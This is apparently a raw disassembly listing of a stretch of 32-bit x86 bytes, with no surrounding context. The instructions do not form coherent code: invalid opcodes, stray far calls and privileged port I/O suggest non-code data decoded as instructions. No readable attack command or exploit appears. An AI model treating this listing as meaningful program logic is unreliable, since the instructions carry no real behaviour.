  419fee:	(bad)  [edx+0x5376df58]
  419ff4:	ss jp  0x419fb7
  419ff7:	test   DWORD PTR [ecx-0x1d],ebp
  419ffa:	mov    ebp,0x8a5d03b6
  419fff:	inc    ebx
  41a000:	pop    ecx
  41a001:	(bad)  
  41a002:	sub    eax,0xfa6ffd5
  41a007:	push   eax
  41a008:	or     eax,0x1720a4a7
  41a00d:	inc    esi
  41a00e:	mov    ebp,0x66a5f7f8
  41a013:	jb     0x41a035
  41a015:	pop    ds
  41a016:	and    DWORD PTR [ebx+0x37fde6c7],eax
  41a01c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a01d:	add    dl,ch
  41a01f:	test   DWORD PTR [ebp+0x2b8698d9],ecx
  41a025:	jl     0x41a06b
  41a027:	mov    cl,0xbb
  41a029:	hlt    
  41a02a:	lahf   
  41a02b:	fdivr  QWORD PTR cs:[edx-0x5a452f58]
  41a032:	and    DWORD PTR [ebp+0x4447a3c4],ebp
  41a038:	dec    edx
  41a039:	dec    edi
  41a03a:	and    ch,BYTE PTR [ecx+0x6c17c59f]
  41a040:	daa    
  41a041:	sbb    eax,0x62d7cc82
  41a046:	(bad)  
  41a047:	lea    esp,[ebp-0x1cf854b3]
  41a04d:	or     eax,ecx
  41a04f:	mov    edi,0x5ff89229
  41a054:	loop   0x419ffd
  41a056:	inc    esi
  41a057:	inc    ecx
  41a058:	inc    edi
  41a059:	rol    BYTE PTR [esi],0xdb
  41a05c:	ret    0x325a
  41a05f:	ja     0x41a00a
  41a061:	push   edx
  41a062:	xchg   ebx,eax
  41a063:	mov    bh,0xdf
  41a065:	lods   al,BYTE PTR ds:[esi]
  41a066:	out    dx,al
  41a067:	sub    al,0x8a
  41a069:	add    bl,bl
  41a06b:	(bad)  
  41a06c:	cmp    eax,0x61389dd2
  41a071:	xlat   BYTE PTR ds:[ebx]
  41a072:	push   0x24531405
  41a077:	xchg   ebx,eax
  41a078:	mov    fs,WORD PTR [ebx]
  41a07a:	cs retf 
  41a07c:	cld    
  41a07d:	pop    es
  41a07e:	push   eax
  41a07f:	imul   ebx,DWORD PTR [edi],0xffffffb9
  41a082:	or     eax,0xf93fc2de
  41a087:	cld    
  41a088:	scas   al,BYTE PTR es:[edi]
  41a089:	mov    ecx,0xc405a863
  41a08e:	jns    0x41a03e
  41a090:	add    BYTE PTR [ebp-0x62356ec1],cl
  41a096:	pop    ss
  41a097:	xor    DWORD PTR [eax+0xeaece00],edx
  41a09d:	cmp    eax,0x11087ef0
  41a0a2:	inc    ebp
  41a0a3:	sbb    al,BYTE PTR [edx]
  41a0a5:	rcr    dh,cl
  41a0a7:	pop    ebx
  41a0a8:	cdq    
  41a0a9:	je     0x41a046
  41a0ab:	xchg   ebp,eax
  41a0ac:	pop    edx
  41a0ad:	fistp  WORD PTR [esi+eax*1]
  41a0b0:	add    eax,0x9312796e
  41a0b5:	scas   al,BYTE PTR es:[edi]
  41a0b6:	dec    esi
  41a0b7:	es push eax
  41a0b9:	fisttp QWORD PTR ds:0xd5bf434
  41a0bf:	test   BYTE PTR [edx-0x2c],al
  41a0c2:	pop    ss
  41a0c3:	jae    0x41a136
  41a0c5:	sub    cl,al
  41a0c7:	call   0x6091cac0
  41a0cc:	ins    BYTE PTR es:[edi],dx
  41a0cd:	std    
  41a0ce:	push   esi
  41a0cf:	mov    esp,0x2aa8ba78
  41a0d4:	out    0xe6,eax
  41a0d6:	loopne 0x41a10e
  41a0d8:	retf   0xc9be
  41a0db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0dc:	jb     0x41a093
  41a0de:	iret   
  41a0df:	push   es
  41a0e0:	mov    cl,0xae
  41a0e2:	mov    ?,WORD PTR [ebx]
  41a0e4:	clc    
  41a0e5:	clc    
  41a0e6:	enter  0x8ee7,0xc7
  41a0ea:	xchg   esi,eax
  41a0eb:	(bad)  
  41a0ec:	pop    edi
  41a0ed:	push   esi
  41a0ee:	adc    BYTE PTR [edi],bl
  41a0f0:	sbb    BYTE PTR [ebp-0x42],bl
  41a0f3:	ins    BYTE PTR es:[edi],dx
  41a0f4:	addr16 jge 0x41a08d
  41a0f7:	stos   DWORD PTR es:[edi],eax
  41a0f8:	push   esp
  41a0f9:	adc    cl,BYTE PTR [esi-0x7aa38556]
  41a0ff:	cmp    cl,dl
  41a101:	xlat   BYTE PTR ds:[ebx]
  41a102:	scas   al,BYTE PTR es:[edi]
  41a103:	pusha  
  41a104:	loope  0x41a123
  41a106:	and    al,0x87
  41a108:	xchg   edi,eax
  41a109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a10a:	ss dec esp
  41a10c:	xchg   BYTE PTR [edi+0x32e9ff71],al
  41a112:	adc    al,0x71
  41a114:	out    dx,al
  41a115:	cmp    BYTE PTR [ecx+ebp*8],dl
  41a118:	or     ebp,eax
  41a11a:	loope  0x41a14d
  41a11c:	sbb    dh,ch
  41a11e:	xchg   DWORD PTR [eax-0x66],edx
  41a121:	adc    ah,BYTE PTR [ecx+0x12]
  41a124:	inc    edx
  41a125:	xlat   BYTE PTR ds:[ebx]
  41a126:	scas   eax,DWORD PTR es:[edi]
  41a127:	ss inc ebx
  41a129:	pop    ebp
  41a12a:	mov    bl,0xbe
  41a12c:	bound  esi,QWORD PTR [ebx]
  41a12e:	mov    dl,0xc
  41a130:	sub    ebp,DWORD PTR [edx-0x66]
  41a133:	test   al,0x33
  41a135:	sbb    BYTE PTR [ebx],ah
  41a137:	mov    dh,0xab
  41a139:	mov    ecx,0x23eb2893
  41a13e:	daa    
  41a13f:	and    dl,cl
  41a141:	xchg   edi,eax
  41a142:	(bad)  
  41a143:	pop    ds
  41a144:	cmp    edx,DWORD PTR [edx+esi*2+0x42]
  41a148:	lea    edi,[eax]
  41a14a:	sbb    dl,BYTE PTR [esp+ebx*4+0x57]
  41a14e:	cmp    eax,0xe77d642f
  41a153:	xor    al,0x28
  41a155:	jbe    0x41a191
  41a157:	sti    
  41a158:	dec    ebp
  41a159:	scas   eax,DWORD PTR es:[edi]
  41a15a:	bound  ebp,QWORD PTR [edi]
  41a15c:	adc    esp,DWORD PTR [ebp-0x4eeefb73]
  41a162:	mul    BYTE PTR [esi+0x24]
  41a165:	mov    al,0xa6
  41a167:	call   0x4fb9:0x1a3928d0
  41a16e:	mov    DWORD PTR [edx-0x496ea3ab],0xa5dc5de7
  41a178:	scas   al,BYTE PTR es:[edi]
  41a179:	ret    
  41a17a:	ror    BYTE PTR [ebx+0x139496c8],cl
  41a180:	pop    ds
  41a181:	dec    esp
  41a182:	out    dx,eax
  41a183:	sbb    eax,0x2911c18d
  41a188:	sahf   
  41a189:	add    al,BYTE PTR [edx]
  41a18b:	call   0x1eab:0x10c41fb
  41a192:	test   BYTE PTR [edi+0x54c0978b],al
  41a198:	rol    DWORD PTR [ecx+ebp*8-0x5c19832d],1
  41a19f:	jb     0x41a21b
  41a1a1:	(bad)  [ebp+0x400bcb41]
  41a1a7:	test   BYTE PTR [ecx+esi*1],al
  41a1aa:	rol    DWORD PTR [esi-0x72],1
  41a1ad:	test   DWORD PTR [esi],ebp
  41a1af:	xchg   edi,eax
  41a1b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1b1:	lock call 0x13fb:0xe0426a88
  41a1b9:	xor    BYTE PTR [eax+0x7f8a96bb],ch
  41a1bf:	mov    bl,al
  41a1c1:	pop    esi
  41a1c2:	mov    cs,WORD PTR [ebp+0x26ed5b68]
  41a1c8:	outs   dx,BYTE PTR ds:[esi]
  41a1c9:	aas    
  41a1ca:	(bad)  
  41a1cb:	push   cs
  41a1cc:	jns    0x41a23f
  41a1ce:	loopne 0x41a232
  41a1d0:	dec    esp
  41a1d1:	loop   0x41a17a
  41a1d3:	mov    dh,0x73
  41a1d5:	arpl   WORD PTR [ecx-0x24e555d4],bp
  41a1db:	push   es
  41a1dc:	xchg   ebp,eax
  41a1dd:	and    ch,BYTE PTR [ecx+0x69f26c2]
  41a1e3:	push   ss
  41a1e4:	dec    edx
  41a1e5:	xchg   esi,eax
  41a1e6:	jnp    0x41a181
  41a1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1e9:	(bad)  [ebx+0x6e4d0679]
  41a1ef:	cmp    al,0x4f
  41a1f1:	mov    ch,0x74
  41a1f3:	sbb    al,BYTE PTR [ebx+esi*1-0x4ec59546]
  41a1fa:	mov    bh,0x5f
  41a1fc:	int    0x8e
  41a1fe:	adc    edi,DWORD PTR [ecx-0x33]
  41a201:	pop    ds
  41a202:	dec    edi
  41a203:	jae    0x41a1da
  41a205:	std    
  41a206:	dec    ebp
  41a207:	xchg   esp,eax
  41a208:	int3   
  41a209:	and    esi,eax
  41a20b:	mov    al,0xac
  41a20d:	sar    DWORD PTR [ebx],0x19
  41a210:	lahf   
  41a211:	mov    ds:0x770c3aad,al
  41a216:	push   esp
  41a217:	cmp    edx,esi
  41a219:	repz or ebp,DWORD PTR [edx+0x27efbf4a]
  41a220:	rep lods eax,DWORD PTR ds:[esi]
  41a222:	retf   0x7064
  41a225:	mov    eax,ds:0x5a5149b5
  41a22a:	jbe    0x41a22d
  41a22c:	inc    DWORD PTR [eax+0x2f11b42a]
  41a232:	(bad)  
  41a233:	mov    esp,0x68f0c4ae
  41a238:	xchg   edx,eax
  41a239:	push   ecx
  41a23a:	adc    DWORD PTR [edx],0x50
  41a23d:	cmc    
  41a23e:	(bad)  
  41a23f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a240:	gs aaa 
  41a242:	mov    bl,0xba
  41a244:	icebp  
  41a245:	in     al,dx
  41a246:	push   ds
  41a247:	sub    BYTE PTR ds:0xa6d5794,al
  41a24d:	js     0x41a2b6
  41a24f:	adc    DWORD PTR [esi+0x14b340f5],ecx
  41a255:	test   BYTE PTR [ecx],bh
  41a257:	sti    
  41a258:	push   ebx
  41a259:	jg     0x41a215
  41a25b:	sbb    ecx,eax
  41a25d:	mov    WORD PTR [ecx-0x41],fs
  41a260:	add    eax,0x25fdbc4
  41a265:	in     al,0x8c
  41a267:	and    al,0x8f
  41a269:	(bad)  
  41a26a:	jno    0x41a2ae
  41a26c:	out    0x51,al
  41a26e:	push   cs
  41a26f:	dec    edx
  41a270:	mov    al,0x44
  41a272:	arpl   WORD PTR [ebx+ecx*4-0x59b401e5],si
  41a279:	cmp    cl,dl
  41a27b:	out    dx,al
  41a27c:	jae    0x41a2f1
  41a27e:	loop   0x41a2be
  41a280:	jbe    0x41a272
  41a282:	push   DWORD PTR [ecx]
  41a284:	out    0xdf,al
  41a286:	push   DWORD PTR [ecx]
  41a288:	cmp    al,0xa6
  41a28a:	inc    esi
  41a28b:	in     al,0xe8
  41a28d:	mov    ebx,0xa0111eb
  41a292:	xor    bh,ah
  41a294:	adc    DWORD PTR [esi+0x38],edi
  41a297:	xor    DWORD PTR [edi],edi
  41a299:	jp     0x41a246
  41a29b:	or     esi,DWORD PTR [edx-0x72c3a5da]
  41a2a1:	gs mov edi,0xf5cdfbab
  41a2a7:	stos   DWORD PTR es:[edi],eax
  41a2a8:	shl    DWORD PTR [edx-0x31],cl
  41a2ab:	(bad)  
  41a2ac:	inc    esp
  41a2ad:	or     DWORD PTR [edx],esi
  41a2af:	xchg   BYTE PTR [eax+0x34dcca24],dh
  41a2b5:	inc    ebx
  41a2b6:	xchg   ebx,eax
  41a2b7:	jle    0x41a271
  41a2b9:	prefetchnta BYTE PTR [ecx]
  41a2bc:	or     DWORD PTR [esi+ebx*8-0x1d],edi
  41a2c0:	adc    cl,BYTE PTR [edi+0x73]
  41a2c3:	jmp    DWORD PTR [ebx]
  41a2c5:	loope  0x41a2ef
  41a2c7:	mov    ebx,0x4eec786e
  41a2cc:	cmc    
  41a2cd:	aam    0xf2
  41a2cf:	pusha  
  41a2d0:	dec    ebp
  41a2d1:	popf   
  41a2d2:	mov    dl,0xaf
  41a2d4:	mov    DWORD PTR [esi+0x369ad47a],edi
  41a2da:	mov    BYTE PTR [eax],cl
  41a2dc:	jmp    0x333:0xac522cbc
  41a2e3:	sahf   
  41a2e4:	mov    edx,0xce36209
  41a2e9:	(bad)  [edx]
  41a2eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2ec:	daa    
  41a2ed:	scas   eax,DWORD PTR es:[edi]
  41a2ee:	stos   BYTE PTR es:[edi],al
  41a2ef:	(bad)  
  41a2f0:	jne    0x41a359
  41a2f2:	add    BYTE PTR [edx+ecx*8-0xdf578c7],cl
  41a2f9:	xchg   edi,eax
  41a2fa:	jne    0x41a2fa
  41a2fc:	icebp  
  41a2fd:	add    BYTE PTR [ebx-0x3051e223],bh
  41a303:	ss popf 
  41a305:	lahf   
  41a306:	out    dx,al
  41a307:	out    0xed,ax
  41a30a:	pop    eax
  41a30b:	test   DWORD PTR ds:0x6456fa57,esi
  41a311:	in     al,dx
  41a312:	or     al,0x82
  41a314:	popf   
  41a315:	adc    al,0x7d
  41a317:	ss lahf 
  41a319:	push   ds
  41a31a:	mov    bh,0x72
  41a31c:	(bad)  
  41a31d:	(bad)  [esi-0x981e890]
  41a323:	ror    DWORD PTR [esi],cl
  41a325:	mov    ds:0xfa3f5f8a,eax
  41a32a:	dec    ebx
  41a32b:	adc    eax,0xea19be1b
  41a330:	popa   
  41a331:	call   0x251498bc
  41a336:	adc    cl,BYTE PTR [edi-0x1d630f6f]
  41a33c:	or     bh,0xe8
  41a33f:	jno    0x41a335
  41a341:	inc    ebp
  41a342:	mov    ds:0xc2845988,eax
  41a347:	test   eax,0xa57f9f59
  41a34c:	jbe    0x41a2e3
  41a34e:	icebp  
  41a34f:	shr    DWORD PTR [edx-0x3ffafb23],0xdf
  41a356:	jmp    0x41a368
  41a358:	push   esp
  41a359:	loopne 0x41a37b
  41a35b:	add    eax,0xdbae56f
  41a360:	push   cs
  41a361:	adc    edi,ebp
  41a363:	outs   dx,BYTE PTR ds:[esi]
  41a364:	jmp    0x629f:0xba814287
  41a36b:	xchg   esi,ebx
  41a36d:	mov    edx,0xfebffc7b
  41a372:	mov    dl,0x5c
  41a374:	push   ecx
  41a375:	cvtdq2ps xmm2,XMMWORD PTR [eax+ecx*1]
  41a379:	jae    0x41a313
  41a37b:	push   es
  41a37c:	dec    edi
  41a37d:	mov    ds:0x6ebd134,eax
  41a382:	mov    al,ds:0x4f7079ff
  41a387:	es sahf 
  41a389:	(bad)  
  41a38a:	popa   
  41a38b:	mov    ebx,0x791608f6
  41a390:	ja     0x41a322
  41a392:	cmp    BYTE PTR [eax-0x442e5782],bl
  41a398:	add    eax,ebp
  41a39a:	or     esp,edi
  41a39c:	int    0xbe
  41a39e:	cmpxchg BYTE PTR [esi+0x4d606d32],ah
  41a3a5:	sar    BYTE PTR [ecx],1
  41a3a7:	in     eax,dx
  41a3a8:	xchg   edi,eax
  41a3a9:	mov    BYTE PTR [ebx+0x2f],dh
  41a3ac:	call   0xa861c3fb
  41a3b1:	ss scas al,BYTE PTR es:[edi]
  41a3b3:	mov    ds:0x5a56b5c3,al
  41a3b8:	int3   
  41a3b9:	cmp    ecx,DWORD PTR ds:0x34c3e7d8
  41a3bf:	aad    0xe5
  41a3c1:	out    0xba,eax
  41a3c3:	mov    ds:0x6b023dc2,eax
  41a3c8:	mov    ds:0xe8fda495,eax
  41a3cd:	loopne 0x41a42f
  41a3cf:	mov    esi,0xe60514c6
  41a3d4:	add    BYTE PTR [edi],0x99
  41a3d7:	mov    edi,0xbebb70c5
  41a3dc:	in     eax,dx
  41a3dd:	pop    esp
  41a3de:	hlt    
  41a3df:	xor    al,0x3c
  41a3e1:	push   es
  41a3e2:	pop    esp
  41a3e3:	add    esp,DWORD PTR [ecx-0x1b]
  41a3e6:	jb     0x41a43d
  41a3e8:	bound  edx,QWORD PTR [edx+0x3f04ed2d]
  41a3ee:	adc    al,0x2a
  41a3f0:	sbb    al,0x6a
  41a3f2:	sub    cl,dh
  41a3f4:	sub    DWORD PTR [eax],ebp
  41a3f6:	sub    ch,BYTE PTR [edi+0x6f]
  41a3f9:	pop    edx
  41a3fa:	outs   dx,DWORD PTR ds:[esi]
  41a3fb:	pop    ebx
  41a3fc:	bound  ebp,QWORD PTR [ecx+0x71431c11]
  41a402:	leave  
  41a403:	mov    DWORD PTR [edi-0x74],ebx
  41a406:	push   ds
  41a407:	dec    esi
  41a408:	repnz mov esi,0xbecd4535
  41a40e:	jp     0x41a445
  41a410:	aam    0xe8
  41a412:	jne    0x41a3f7
  41a414:	loope  0x41a48a
  41a416:	stc    
  41a417:	xchg   edx,eax
  41a418:	sti    
  41a419:	retf   0x6bec
  41a41c:	into   
  41a41d:	cmp    edi,esi
  41a41f:	mov    ds,esp
  41a421:	ror    DWORD PTR [edx],0xc9
  41a424:	std    
  41a425:	lods   al,BYTE PTR ds:[esi]
  41a426:	lock jnp 0x41a449
  41a429:	sub    eax,DWORD PTR [eax+ebx*1-0x26f8f7bf]
  41a430:	or     DWORD PTR [ecx],esi
  41a432:	adc    al,BYTE PTR [ebp+eiz*1-0x5034557f]
  41a439:	daa    
  41a43a:	ds mov dh,0x77
  41a43d:	mov    edi,0x7a5c7dba
  41a442:	(bad)
  41a446:	mov    ah,0x84
  41a448:	add    eax,0x916a214b
  41a44d:	jno    0x41a47f
  41a44f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a450:	pop    esp
  41a451:	fprem1 
  41a453:	cli    
  41a454:	dec    edi
  41a455:	xchg   edx,eax
  41a456:	std    
  41a457:	xor    DWORD PTR [eax-0x20],eax
  41a45a:	pop    ecx
  41a45b:	ret    
  41a45c:	push   ecx
  41a45d:	(bad)  
  41a45e:	xchg   edi,eax
  41a45f:	test   al,0xdf
  41a461:	ja     0x41a49b
  41a463:	mov    bh,0xc2
  41a465:	push   ecx
  41a466:	mov    eax,0xad94393d
  41a46b:	mov    eax,0x4ac52a25
  41a470:	repnz or bh,BYTE PTR ds:0x85c399fe
  41a477:	add    eax,0x5a0482c5
  41a47c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a47d:	adc    dl,cl
  41a47f:	adc    bh,ah
  41a481:	rol    DWORD PTR [ebp+0x5e],cl
  41a484:	ds cdq 
  41a486:	call   0xa0d6:0xdfbfe442
  41a48d:	sbb    esi,edx
  41a48f:	daa    
  41a490:	loopne 0x41a45c
  41a492:	fsubr  QWORD PTR [edi-0x2f]
  41a495:	fstp   TBYTE PTR [ebp+0x53444ace]
  41a49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a49c:	inc    esp
  41a49d:	icebp  
  41a49e:	xchg   edi,eax
  41a49f:	dec    ebx
  41a4a0:	lods   al,BYTE PTR ds:[esi]
  41a4a1:	aam    0xae
  41a4a3:	lods   eax,DWORD PTR ds:[esi]
  41a4a4:	call   0xdfd3:0x761fc238
  41a4ab:	mul    DWORD PTR [eax]
  41a4ad:	or     edi,DWORD PTR [ebp-0x45]
  41a4b0:	sub    bl,BYTE PTR [eax+ecx*8+0x18]
  41a4b4:	iret   
  41a4b5:	das    
  41a4b6:	enter  0x8316,0x4d
  41a4ba:	jmp    0x362b155c
  41a4bf:	mov    ds:0x3688746,al
  41a4c4:	xor    eax,0x39174156
  41a4c9:	sahf   
  41a4ca:	es retf 0xe7a6
  41a4ce:	fisubr WORD PTR ds:[edx]
  41a4d1:	mov    esi,DWORD PTR [ebx+0x172befd2]
  41a4d7:	repz mov ebp,0x617885bd
  41a4dd:	pop    ss
  41a4de:	cmp    esi,DWORD PTR [edi-0x9]
  41a4e1:	mov    cl,0x18
  41a4e3:	lock and al,0x3b
  41a4e6:	jae    0x41a553
  41a4e8:	out    0xe7,al
  41a4ea:	mov    es,WORD PTR [bp+0x70c0]
  41a4ef:	and    eax,0x2401fff0
  41a4f4:	xchg   esp,eax
  41a4f5:	push   edi
  41a4f6:	repnz in eax,dx
  41a4f8:	push   ecx
  41a4f9:	(bad)  
  41a4fb:	imul   BYTE PTR [edx+0x40]
  41a4fe:	add    dl,BYTE PTR [eax]
  41a500:	mov    al,ds:0x29358e8f
  41a505:	ret    
  41a506:	test   DWORD PTR [edx+ecx*4-0x55fd7fc1],ecx
  41a50d:	mov    bh,BYTE PTR [edi+0x71]
  41a510:	add    al,0x70
  41a512:	repz (bad) 
  41a515:	cmp    dl,BYTE PTR [esp]
  41a518:	pop    es
  41a519:	ja     0x41a4c9
  41a51b:	cld    
  41a51c:	jbe    0x41a4bd
  41a51e:	and    DWORD PTR [edi],esi
  41a520:	(bad)  
  41a521:	xor    DWORD PTR [ecx-0x2e],edx
  41a524:	push   es
  41a525:	pop    esp
  41a526:	push   0xffffffcb
  41a528:	mov    DWORD PTR [edi-0x4f],ebx
  41a52b:	shl    DWORD PTR [edx-0x7b],cl
  41a52e:	lds    esp,FWORD PTR [esi-0x5c3ecb9a]
  41a534:	pop    ds
  41a535:	push   es
  41a536:	in     eax,dx
  41a537:	mov    eax,ds:0x835e832
  41a53c:	cld    
  41a53d:	add    esi,DWORD PTR [edi+0x6dc2912c]
  41a543:	pop    es
  41a544:	fcom   DWORD PTR [esi]
  41a546:	mov    edi,0xc222bade
  41a54b:	pop    ebp
  41a54c:	lock pop es
  41a54e:	dec    ebp
  41a54f:	gs push 0xfffffff3
  41a552:	fwait
  41a553:	push   ss
  41a554:	add    ch,BYTE PTR [edx]
  41a556:	in     eax,dx
  41a557:	push   ds
  41a558:	xlat   BYTE PTR ds:[ebx]
  41a559:	pmulhw mm0,QWORD PTR [ebx]
  41a55c:	sbb    BYTE PTR [eax-0x14],bh
  41a55f:	dec    esp
  41a560:	sub    DWORD PTR [ecx*4+0x6fc8016e],ebx
  41a567:	sbb    edi,edx
  41a569:	mov    ecx,0xd1c955f4
  41a56e:	add    BYTE PTR [ecx+0x12],0x5e
  41a572:	ja     0x41a52b
  41a574:	aas    
  41a575:	adc    al,0x4d
  41a577:	std    
  41a578:	inc    esp
  41a579:	imul   edx,DWORD PTR [edx],0x4e
  41a57c:	and    al,BYTE PTR [eax+edx*8-0x43]
  41a580:	mov    esi,esi
  41a582:	mov    al,0x4d
  41a584:	idiv   DWORD PTR [eax-0x5210a9b1]
  41a58a:	fs jns 0x41a553
  41a58d:	mov    DWORD PTR [eax],eax
  41a58f:	dec    ebp
  41a590:	inc    eax
  41a591:	imul   edx,DWORD PTR [ecx-0x1c],0x256848b5
  41a598:	add    BYTE PTR [esi+0x26],dh
  41a59b:	xor    DWORD PTR [edx-0x70],ebp
  41a59e:	push   cs
  41a59f:	repz push ebx
  41a5a1:	xchg   esp,eax
  41a5a2:	jbe    0x41a5a2
  41a5a4:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41a5a6:	mov    bh,0xd2
  41a5a8:	ins    DWORD PTR es:[edi],dx
  41a5a9:	iret   
  41a5aa:	mov    eax,ds:0xd7666a36
  41a5af:	adc    BYTE PTR [ecx-0x32],0xc1
  41a5b3:	inc    edi
  41a5b4:	add    al,0x7e
  41a5b6:	mov    dh,0xbb
  41a5b8:	mov    ch,0x72
  41a5ba:	rcr    BYTE PTR [edi],1
  41a5bc:	test   eax,0x75194a03
  41a5c1:	ja     0x41a5f5
  41a5c3:	pop    es
  41a5c4:	dec    ecx
  41a5c5:	je     0x41a5b2
  41a5c7:	aas    
  41a5c8:	xor    cl,BYTE PTR [edx+0x42]
  41a5cb:	push   ecx
  41a5cc:	dec    esi
  41a5cd:	add    bh,BYTE PTR [esi]
  41a5cf:	test   edi,esi
  41a5d1:	test   DWORD PTR [edi+0x1b],edx
  41a5d4:	into   
  41a5d5:	sbb    al,0xe9
  41a5d7:	int    0xa5
  41a5d9:	cmp    eax,0x2a96bf8b
  41a5de:	adc    DWORD PTR [esi],esi
  41a5e0:	daa    
  41a5e1:	sub    eax,0x6d4e1005
  41a5e6:	push   ds
  41a5e7:	out    0x0,eax
  41a5e9:	mov    bh,0x56
  41a5eb:	inc    ecx
  41a5ec:	ins    DWORD PTR es:[edi],dx
  41a5ed:	mov    ecx,0x2685c35b
  41a5f2:	sbb    ch,BYTE PTR [edx+0x29ae7da4]
  41a5f8:	mov    dh,0xd5
  41a5fa:	mov    ecx,0x4262efb1
  41a5ff:	mov    ch,0x3d
  41a602:	sbb    al,0x51
  41a604:	lock mov ch,0xdb
  41a607:	inc    edx
  41a608:	fldenv [ecx]
  41a60a:	stos   DWORD PTR es:[edi],eax
  41a60b:	and    al,0xf6
  41a60d:	xor    ebx,0xd370bf2f
  41a613:	idiv   ecx
  41a615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a616:	data16 mov dh,0x6b
  41a619:	xchg   bl,al
  41a61b:	cld    
  41a61c:	push   0xfc5c8ff8
  41a621:	cld    
  41a622:	aam    0x53
  41a624:	imul   edi,DWORD PTR [edx-0x5a],0xffffffcf
  41a628:	mov    al,ds:0xa02d1c78
  41a62d:	and    DWORD PTR [ebx],0x523137cd
  41a633:	(bad)  
  41a634:	cmc    
  41a635:	outs   dx,BYTE PTR ds:[esi]
  41a636:	ss jne 0x41a68c
  41a639:	cmp    al,BYTE PTR [ecx-0x13]
  41a63c:	pop    ebx
  41a63d:	xor    al,0x25
  41a63f:	lods   eax,DWORD PTR ds:[esi]
  41a640:	jmp    0x28a5:0xeb18b2f4
  41a647:	int3   
  41a648:	jp     0x41a63b
  41a64a:	or     ch,BYTE PTR [edx-0x29]
  41a64d:	mov    al,ds:0xb6735528
  41a652:	adc    DWORD PTR [ebp+0x6623f04f],0x70
  41a659:	cmp    BYTE PTR [esp+ecx*4+0x9889b51],0x55
  41a661:	ss add cl,cl
  41a664:	push   0xffffffb8
  41a666:	add    DWORD PTR [ebx],0x5c
  41a669:	(bad)  
  41a66a:	push   ds
  41a66b:	and    dl,BYTE PTR [edi-0x10d2e4d9]
  41a671:	cmp    DWORD PTR [ebx-0x32],0x55ea1072
  41a678:	cmp    edi,DWORD PTR [edi+0x16]
  41a67b:	pop    ds
  41a67c:	xlat   BYTE PTR ds:[ebx]
  41a67d:	das    
  41a67e:	dec    ebx
  41a67f:	fwait
  41a680:	sub    al,0x9e
  41a682:	cmp    al,0x3d
  41a684:	out    0x44,al
  41a686:	idiv   DWORD PTR [ebx]
  41a688:	cmc    
  41a689:	xchg   ebx,eax
  41a68a:	je     0x41a653
  41a68c:	dec    ecx
  41a68d:	sub    ebp,DWORD PTR ds:0xfe03ba0c
  41a693:	outs   dx,DWORD PTR ds:[esi]
  41a694:	or     esp,DWORD PTR [ebp+0x76d043a8]
  41a69a:	loopne 0x41a6a6
  41a69c:	out    dx,al
  41a69d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a69e:	loope  0x41a694
  41a6a0:	into   
  41a6a1:	imul   eax,DWORD PTR [ebx],0x6e
  41a6a4:	mov    ah,0x5
  41a6a6:	dec    ebp
  41a6a7:	punpckldq mm1,DWORD PTR [edx-0x27770ae7]
  41a6ae:	jmp    0x517e:0x2c095900
  41a6b5:	mov    edi,0x10ac10cd
  41a6ba:	push   ebx
  41a6bb:	lods   al,BYTE PTR ds:[esi]
  41a6bc:	retf   0x7a6c
  41a6bf:	and    BYTE PTR [edi+0x11fb6f20],ah
  41a6c5:	dec    ebp
  41a6c6:	fld    DWORD PTR [edi+0x78]
  41a6c9:	jo     0x41a735
  41a6cb:	rcr    BYTE PTR [bp+di+0x6f78],cl
  41a6d0:	jle    0x41a684
  41a6d2:	pop    eax
  41a6d3:	sbb    bl,BYTE PTR [ebx-0x6c]
  41a6d6:	in     eax,dx
  41a6d7:	push   ebx
  41a6d8:	shl    BYTE PTR [edi],0xd
  41a6db:	dec    esi
  41a6dc:	mov    es,WORD PTR [edi-0x53]
  41a6df:	outs   dx,BYTE PTR ds:[esi]
  41a6e0:	loopne 0x41a67d
  41a6e2:	cmp    BYTE PTR [edi+0x12],al
  41a6e5:	lock in eax,dx
  41a6e7:	ror    DWORD PTR [eax+0x6d258cd1],cl
  41a6ed:	cmp    eax,0x987defe0
  41a6f2:	enter  0xa454,0x97
  41a6f6:	std    
  41a6f7:	pop    eax
  41a6f8:	pusha  
  41a6f9:	lds    ebp,FWORD PTR [eax+ebp*8-0x5c221205]
  41a700:	ficomp WORD PTR [ebx-0x183b1177]
  41a706:	sub    BYTE PTR [ebp-0x689a5a2],0x51
  41a70d:	xchg   esi,eax
  41a70e:	or     edx,DWORD PTR [ebx+0x2799c7c6]
  41a714:	push   es
  41a715:	xchg   esp,eax
  41a716:	aam    0x4
  41a718:	or     edx,0xffffffd7
  41a71b:	sub    esp,DWORD PTR [edx]
  41a71d:	sbb    al,0xcb
  41a71f:	adc    BYTE PTR [ebp+0x6f7fb9ba],cl
  41a725:	pop    edx
  41a726:	adc    ecx,esp
  41a728:	retf   
  41a729:	ror    BYTE PTR [ebx+0x72],cl
  41a72c:	loop   0x41a6e3
  41a72e:	adc    dh,BYTE PTR [edi]
  41a730:	push   ss
  41a731:	jnp    0x41a73a
  41a733:	cwde   
  41a734:	dec    ecx
  41a735:	xor    DWORD PTR [ecx+0x6c2efbcc],0xffffffa5
  41a73c:	adc    eax,0x624ff335
  41a741:	or     BYTE PTR [ebp-0x32],al
  41a744:	xchg   esi,eax
  41a745:	(bad)  
  41a746:	imul   esp
  41a748:	leave  
  41a749:	sbb    al,0xb1
  41a74b:	call   DWORD PTR [ebx+edx*1+0x739e830c]
  41a752:	daa    
  41a753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a754:	nop
  41a755:	ds adc al,0xa8
  41a758:	mov    dh,0xbf
  41a75a:	fwait
  41a75b:	jmp    0xcfd3f256
  41a760:	sub    eax,0xe59c8d1e
  41a765:	jb     0x41a7e0
  41a767:	mov    bh,0xce
